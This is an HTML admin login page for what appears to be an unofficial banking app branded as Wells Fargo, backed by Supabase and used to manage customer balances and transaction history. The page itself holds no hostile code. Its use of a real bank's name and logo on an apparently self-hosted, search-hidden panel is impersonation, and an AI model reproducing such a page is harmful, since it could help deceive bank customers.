<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="robots" content="noindex, nofollow" />
  <title>Wellsfargo Admin Login</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
  <link rel="stylesheet" href="css/admin.css?v=switch2" />
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script src="../js/supabase-config.js"></script>
  <script src="../js/db.js?v=proxy1"></script>
</head>
<body>
  <div class="login-view">
    <div class="login-panel">
      <div class="brand-block">
        <img src="../images/wells.png" alt="Wells Fargo" class="brand-logo" />
        <h1>Admin Console</h1>
        <p>Manage customer accounts, balances, and transaction history.</p>
      </div>

      <div id="configWarn" class="form-error" style="display:none;margin-bottom:12px">
        Configure <code>js/supabase-config.js</code> and run the schema before signing in.
      </div>

      <form id="adminLoginForm" class="login-form">
        <label for="username">Username</label>
        <input type="text" id="username" autocomplete="username" required placeholder="Admin username" />

        <label for="password">Password</label>
        <div class="password-field">
          <input type="password" id="password" autocomplete="current-password" required />
          <button type="button" class="password-toggle" data-target="password" aria-label="Show password">
            <i class="fas fa-eye"></i>
          </button>
        </div>

        <button type="submit" class="btn btn-primary" id="loginBtn">Sign In</button>
        <p class="form-error" id="loginError"></p>
      </form>

      <a href="../index.html" class="back-link">Back to banking app</a>
    </div>
  </div>

  <script src="js/admin-login.js"></script>
</body>
</html>
